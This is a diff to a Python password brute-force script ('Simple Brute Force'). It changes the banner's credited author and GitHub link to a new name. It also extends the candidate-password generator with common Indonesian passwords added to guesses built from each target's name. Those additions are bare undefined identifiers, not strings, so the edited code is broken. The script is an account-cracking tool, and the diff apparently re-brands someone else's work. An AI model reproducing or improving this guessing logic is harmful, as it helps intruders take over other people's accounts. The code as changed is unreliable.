@@ -12,7 +12,7 @@ ttl = []
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
 def logo():
-    print('\n   _______  ____    ___ \n  / __/ _ )/ __/___|_  | ┌────────────────────────┐\n _\ \/ _  / _//___/ __/  │  • Coded By Dapunta •  │\n/___/____/_/     /____/  │ Github.com/Dapunta/sbf │\n  Simple Brute Force     └────────────────────────┘\n')
+    print('\n   _______  ____    ___ \n  / __/ _ )/ __/___|_  | ┌────────────────────────┐\n _\ \/ _  / _//___/ __/  │  • Coded By Bangkeet •  │\n/___/____/_/     /____/  │ Github.com/Bangkeet/sbf │\n  Simple Brute Force     └────────────────────────┘\n')
 
 def login():
     os.system('rm -rf token.txt');os.system('clear');logo()
@@ -47,8 +47,8 @@ def password(text):
     results=[]
     for i in text.split(" "):
         i=i.lower()
-        if len(i)>=6 : results.append(i);results.append(i+"123");results.append(i+"12345")
-        elif len(i)==3 or len(i)==4 or len(i)==5 : results.append(i+"123");results.append(i+"12345")
+        if len(i)>=6 : results.append(i);results.append(i+"123");results.append(i+"12345");results.append(sayang);results.append(bangsat);results.append(anjing);results.append(bismillah);results.append(kontol);results.append(rahasia) 
+        elif len(i)==3 or len(i)==4 or len(i)==5 : results.append(i+"123");results.append(i+"12345");results.append(sayang);results.append(bangsat);results.append(anjing);results.append(bismillah);results.append(kontol);results.append(rahasia)
         else:continue
     return results
 
